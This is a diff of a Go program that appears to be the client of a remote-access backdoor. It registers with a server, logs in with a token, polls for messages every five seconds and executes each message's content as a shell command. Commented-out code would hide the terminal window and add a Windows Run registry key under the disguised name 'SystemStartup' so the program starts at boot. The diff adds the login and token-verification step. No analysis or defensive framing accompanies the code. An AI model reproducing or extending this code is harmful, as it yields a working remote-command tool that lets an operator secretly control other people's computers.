@@ -8,9 +8,7 @@ import (
 	"fmt"
 	"io"
 	"log"
-	"math/rand"
 	"net/http"
-	"strconv"
 	"time"
 )
 
@@ -20,9 +18,16 @@ const BaseUrl = server.BaseUrl
 
 var client *http.Client
 
+var token string
+
+var exitChan chan bool
+
 func init() {
 	client = &http.Client{}
-	ID = strconv.FormatInt(rand.New(rand.NewSource(time.Now().UnixNano())).Int63(), 10)
+	ID = "u89u89"
+	token = ""
+	login()
+	exitChan = make(chan bool)
 	////隐藏终端窗口，修改windows注册表实现开机自动启动
 	//keyName := `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` //自启动注册表路径
 	//valueName := `SystemStartup`                                                  //伪装注册表名
@@ -35,24 +40,35 @@ func init() {
 
 func main() {
 	log.Println(ID)
+	log.Println(token)
+	if token == "" {
+		log.Println("登录失败！")
+		return
+	}
 	go func() {
 		for {
 			alive()
 			time.Sleep(5 * time.Second)
 		}
 	}()
-	for {
-		time.Sleep(5 * time.Second)
-		msg := getMessage()
-		if msg != nil {
-			cmdLine := msg.Content
-			if cmdLine != nil {
-				cmd := NewCommand(cmdLine.(string))
-				cmd.Exec()
+	go func() {
+		for {
+			time.Sleep(5 * time.Second)
+			msg := getMessage()
+			if msg != nil {
+				cmdLine := msg.Content
+				if cmdLine != nil {
+					cmd := NewCommand(cmdLine.(string))
+					cmd.Exec()
+				}
+			} else {
+				continue
 			}
-		} else {
-			continue
 		}
+	}()
+	select {
+	case <-exitChan:
+		return
 	}
 }
 
@@ -79,8 +95,8 @@ func postFeedback(m *mq.Message) {
 
 }
 
-func alive() {
-	url := fmt.Sprintf("%s/register", BaseUrl)
+func login() {
+	url := fmt.Sprintf("%s/login", BaseUrl)
 	data := make(map[string]string)
 	data["id"] = ID
 	bytesData, err := json.Marshal(data)
@@ -90,6 +106,31 @@ func alive() {
 	body, err := io.ReadAll(resp.Body)
 	msg := &mq.Message{}
 	err = json.Unmarshal(body, msg)
+	if err != nil {
+		return
+	}
+	content, _ := msg.Content.(string)
+	token = content
+	fmt.Println(msg.Content)
+}
+
+func alive() {
+	url := fmt.Sprintf("%s/verify", BaseUrl)
+	data := make(map[string]string)
+	data["id"] = ID
+	data["token"] = token
+	bytesData, err := json.Marshal(data)
+	req, _ := http.NewRequest("POST", url, bytes.NewReader(bytesData))
+	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
+	resp, err := client.Do(req)
+	body, err := io.ReadAll(resp.Body)
+	msg := &mq.Message{}
+	err = json.Unmarshal(body, msg)
+	success, _ := msg.Content.(bool)
+	if !success {
+		log.Println("验证失败！")
+		exitChan <- true
+	}
 	if err != nil {
 		return
 	}
